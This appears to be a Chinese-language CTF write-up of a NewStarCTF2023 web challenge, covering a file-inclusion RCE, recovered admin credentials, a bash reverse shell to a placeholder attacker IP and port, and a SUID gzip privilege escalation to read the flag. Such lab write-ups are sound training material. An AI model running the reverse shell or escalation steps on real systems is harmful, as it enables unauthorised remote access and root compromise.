---
title: NewStarCTF2023 week5 web 4-复盘
date: 2023-11-2 16:17 +0800
categories: [CTF,WEB]
tags: [web]
img_path: /assets/images/
---



通过第三周流量分析题和题目给的源代码得到

best_admin
so_hard_password

和主页存在文件包含rce漏洞

![image-20231102160836752](4-复盘.assets/image-20231102160836752.png)‘



和newstar 之前两道题目一模一样，一步的lfl+rce 和 linux 提权

![image-20231102160937766](4-复盘.assets/image-20231102160937766.png)



这个靶机有点问题，哥斯拉不是很好用，我们反弹shell到 公网服务器上

```
bash -i >& /dev/tcp/攻击机IP/端口 0>&1
```

**![image-20231102161238097](4-复盘.assets/image-20231102161238097.png)**

老套路，只能root权限才能查看flag文件，提权

还是查看suid位

![image-20231102161400877](4-复盘.assets/image-20231102161400877.png)

gzip 查看flag

```
sudo install -m =xs $(which gzip) .

LFILE=file_to_read
./gzip -f $LFILE -t
```



![image-20231102161124753](4-复盘.assets/image-20231102161124753.png)

成功解出

![image-20231102161515150](4-复盘.assets/image-20231102161515150.png)